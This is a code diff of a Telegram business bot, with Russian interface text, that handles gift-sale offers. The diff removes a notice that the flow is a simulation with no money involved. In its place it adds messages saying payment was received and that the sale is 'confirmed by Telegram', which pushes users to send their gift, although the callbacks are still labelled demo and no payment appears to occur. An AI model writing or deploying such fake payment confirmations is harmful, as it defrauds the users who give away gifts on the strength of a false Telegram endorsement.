@@ -163,7 +163,7 @@ def render_final(offer: dict, custom: bool) -> str:
             f"{gift_icon(custom)} Подарок {gift_link} "
             f"отмечен как проданный за <b>{offer['stars']} {star_icon(custom)}</b> "
             "<b>все готово! </b>\n\n"
-            "Оплата усмешно была поступлена с пожалуйста, отправьте подарок пользователю, после чего вы получите звезды на ваш баланс. "
+            "Оплата успешно была поступлена с пожалуйста, отправьте подарок пользователю, после чего вы получите звезды на ваш баланс. "
         )
     if offer["status"] == "declined":
         return (
@@ -185,8 +185,8 @@ def render_final(offer: dict, custom: bool) -> str:
 def keyboard(offer_id: int, url: str) -> dict:
     return {"inline_keyboard": [
         [{"text": "ПОКАЗАТЬ ПОДАРОК", "url": url}],
-        [{"text": "✖ Отклонить", "callback_data": f"demo:no:{offer_id}"},
-         {"text": "✔ Принять", "callback_data": f"demo:yes:{offer_id}"}],
+        [{"text": " Отклонить", "callback_data": f"demo:no:{offer_id}"},
+         {"text": " Принять", "callback_data": f"demo:yes:{offer_id}"}],
     ]}
 
 
@@ -521,7 +521,7 @@ class BusinessBot:
         try:
             self.update_message(self.store.offer(offer_id))
             self.store.set_rendered(offer_id)
-            answer("Симуляция завершена. Денежных операций нет.")
+            answer("принято! теперь отправьте подарок пользователю в чате. ( ПОДТВЕРЖДЕНО TELEGRAM) ")
         except TelegramError:
             # Database has a terminal state; cron-like sweep will retry edit.
             LOG.exception("Could not edit offer %d, will retry", offer_id)
